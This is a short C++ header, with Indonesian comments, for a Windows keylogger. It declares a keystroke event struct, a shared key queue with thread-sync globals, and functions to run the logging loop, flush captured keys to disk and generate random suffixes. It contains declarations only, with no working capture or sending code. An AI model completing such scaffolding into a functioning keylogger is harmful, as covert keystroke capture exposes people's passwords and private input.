#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <windows.h>
#include <string>
#include <vector>
#include <queue>
#include <atomic>
#include <mutex>
#include <condition_variable>

// --- Definisi Struct KeyEvent dipindah ke Header agar bisa dikenali global ---
struct KeyEvent {
    DWORD vkCode;
    bool isShift;
    bool isCaps;
};

// --- Globals ---
// Perhatikan: Tipe queue diubah dari KBDLLHOOKSTRUCT menjadi KeyEvent
extern std::queue<KeyEvent> rawKeyQueue;
extern std::atomic<bool> isRunning;
extern std::mutex queueMtx;
extern std::condition_variable queueCv;

// --- Function Declarations ---
void KeylogLoop();
void FlushKeylogToDisk();
std::string GetRandomSuffix(int length);

#endif // KEYLOGGER_H